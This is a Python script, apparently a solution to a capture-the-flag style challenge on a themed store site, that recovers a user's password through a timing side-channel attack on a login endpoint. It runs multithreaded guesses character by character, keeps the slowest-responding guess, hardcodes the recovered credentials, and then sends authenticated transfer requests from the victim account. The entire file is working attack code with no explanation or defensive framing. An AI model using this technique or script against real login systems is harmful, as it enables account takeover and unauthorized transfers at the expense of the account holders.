import string
import requests
import time
import threading
import queue

# data = {'username': 'marty_mcfly', 'password': 'Sy3aaaaaaaaaa'}
# start = time.time()
# r = requests.post('https://store.delorean.codes/u/spencerc99/login',
#                     data)
# timetook = time.time() - start
# print (timetook)


def brute_force_parallel(curr_password, username, num_worker_threads):
    possible_combos = string.ascii_letters + string.digits
    # reverses it
    possible_combos = possible_combos[::-1]
    length_to_run = 12 - len(curr_password)
    password = list(curr_password + ("a" * length_to_run))
    prev_time = len(curr_password) * .45 + 1
    reqs = {}
    print(password)

    def worker():
        while True:
            item = q.get()
            if item is None:
                break
            i = item[0]
            char = item[1]
            password[i] = char
            temp_pass = "".join(password)
            data = {'username': username, 'password': temp_pass}
            start_time = time.time()
            r = requests.post('https://store.delorean.codes/u/spencerc99/login',
                                data)
            request_time = time.time() - start_time
            reqs[temp_pass] = request_time
            print ('Tried {} and took {} time'.format(temp_pass, request_time))
            q.task_done()
    q = queue.LifoQueue()
    threads = []
    for i in range(num_worker_threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        threads.append(t)
        t.start()

    for i in range(len(curr_password), 12):
        reqs = {}

        print("STARTING RUN #{}".format(i))
        for char in possible_combos:
            q.put((i, char))
        q.join()
        maximum_key = max(reqs.keys(), key=(lambda key: reqs[key]))
        password = list(maximum_key)
        prev_time = reqs[maximum_key]
        print()
        print ('Password is {} and time took is {}'.format(maximum_key, reqs[maximum_key]))
        print("FINISHED RUN {}".format(i))

    for i in range(num_worker_threads):
        q.put(None)
    for t in threads:
        t.join()

# curr_password = "S3q5jHGfD"
# username = "marty_mcfly"
curr_password = "75cMauNR8K" # N
username = "biff_tannen"
# brute_force(curr_password, username)
# brute_force_parallel(curr_password, username, 24)

# post transfer
for i in range(2):
    r = requests.post('https://store.delorean.codes/u/spencerc99/transfer', {'to': 'marty_mcfly'}, auth=('biff_tannen', '75cMauNR8K'))
